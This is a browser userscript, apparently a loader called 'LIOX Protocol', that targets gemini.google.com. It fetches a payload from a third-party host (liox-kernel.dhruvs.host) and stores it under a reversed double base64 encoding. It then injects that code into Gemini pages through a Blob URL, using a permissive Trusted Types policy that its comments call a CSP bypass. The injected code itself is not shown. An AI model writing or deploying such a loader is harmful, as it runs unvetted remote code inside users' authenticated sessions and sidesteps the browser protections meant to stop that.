// ==UserScript==
// @name         LIOX Protocol v15.0 (First-Run Redirect)
// @namespace    http://tampermonkey.net/
// @version      15.0
// @description  Manual Auth. Dynamic Branding. Auto-Redirects to Activation on Install.
// @author       Liox
// @match        https://gemini.google.com/*
// @match        https://liox-kernel.dhruvs.host/*
// @grant        GM_xmlhttpRequest
// @grant        GM_setValue
// @grant        GM_getValue
// @grant        unsafeWindow
// ==/UserScript==

(function() {
    'use strict';

    const HOST = window.location.hostname;
    const safeEncrypt = (str) => btoa(btoa(str).split('').reverse().join(''));
    const safeDecrypt = (str) => atob(atob(str).split('').reverse().join(''));

    // ==========================================================
    // PART 1: KERNEL HOST LOGIC (liox-kernel.dhruvs.host)
    // ==========================================================
    if (HOST === 'liox-kernel.dhruvs.host') {
        
        // --- FRESH INSTALL DETECTOR ---
        const setupComplete = GM_getValue("liox_setup_complete", false);

        // If this is the first time running, force redirect to #activate
        if (!setupComplete && window.location.hash !== '#activate') {
            console.log(">>> LIOX: Fresh Install Detected. Redirecting to Activation...");
            GM_setValue("liox_setup_complete", true); // Mark as done so it doesn't loop
            window.location.href = window.location.origin + "/#activate";
            return;
        }

        // --- ACTIVATION LOGIC ---
        // Runs only when we are actually on the #activate page
        const check = setInterval(() => {
            if (window.location.hash === '#activate') {
                const btn = document.getElementById("liox-activate-btn");
                const status = document.getElementById("liox-status");
                
                if (btn && !btn.dataset.bound) {
                    btn.dataset.bound = true;
                    btn.onclick = async () => {
                        if(status) status.textContent = "Connecting to Gateway...";
                        
                        try {
                            const response = await fetch('/api/index.php?action=fetch_payload');
                            const data = await response.json();
                            
                            if (data.payload) {
                                const raw = atob(data.payload);
                                const secure = safeEncrypt(raw);
                                GM_setValue("LIOX_KERNEL_BLOB", secure);
                                
                                if(status) {
                                    status.textContent = "✅ SUCCESS! Kernel Installed.";
                                    status.style.color = "#3fb950";
                                }
                                alert("LIOX Activated Successfully! You may now open Gemini.");
                            }
                        } catch (e) { 
                            if(status) {
                                status.textContent = "Error: " + e.message;
                                status.style.color = "#f85149";
                            }
                        }
                    };
                }
            }
        }, 500);
        return;
    }

    // ==========================================================
    // PART 2: INJECTION LOGIC (Gemini)
    // ==========================================================
    if (HOST.includes("google.com")) {
        setTimeout(() => {
            const blobData = GM_getValue("LIOX_KERNEL_BLOB", null);
            
            // If locked, do nothing (user must go to kernel host to fix)
            if (!blobData) { 
                console.log(">>> LIOX: LOCKED. Visit liox-kernel.dhruvs.host to activate."); 
                return; 
            }

            try {
                const sourceCode = safeDecrypt(blobData);
                let policy = null;
                
                // CSP Bypass: Trusted Types
                if (window.trustedTypes && window.trustedTypes.createPolicy) {
                    try { 
                        policy = window.trustedTypes.createPolicy('liox-policy', { 
                            createScriptURL: (s) => s 
                        }); 
                    } catch (e) {}
                }

                // Create Virtual File (Blob)
                const scriptBlob = new Blob([sourceCode], { type: 'text/javascript' });
                const blobUrl = URL.createObjectURL(scriptBlob);
                const finalUrl = policy ? policy.createScriptURL(blobUrl) : blobUrl;

                // Inject <script>
                const script = document.createElement('script');
                script.type = "text/javascript";
                script.src = finalUrl;
                (document.head || document.documentElement).appendChild(script);
                
                console.log(">>> LIOX KERNEL INJECTED.");
                
            } catch (e) { 
                console.error("LIOX BOOT FAIL:", e); 
            }
        }, 1000);
    }
})();
